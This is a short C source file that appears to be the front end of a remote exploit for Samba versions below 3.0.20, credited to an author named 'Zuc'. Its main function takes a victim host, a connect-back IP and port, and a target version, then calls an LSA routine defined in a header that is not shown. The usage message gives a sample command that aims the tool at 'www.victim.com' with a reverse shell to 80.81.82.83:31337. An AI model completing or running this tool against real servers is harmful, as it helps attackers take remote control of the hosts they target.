#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "in_frontend.h"


#define VERSION 0.1002


int main(int argc, char *argv[])
{ 

printf("\nSamba < 3.0.20 Zuc\n");
printf("by Zuc (zuc@hack.it)\n");
int ax;
if(argc==6)
	ax=1;
else
	ax=0;
if(argc<5 || argc>6)
usage();
LSA(argv[1],argv[2],argv[3],atoi(argv[4]),ax);
// end of main
return 1;
}

int usage()
{
printf("\nUsage: <victim-host> <connectback-ip> <connectback port> <version>\n\n");
printf("Sample: LSA www.victim.com 80.81.82.83 31337 1\n\n");
exit(0);
}

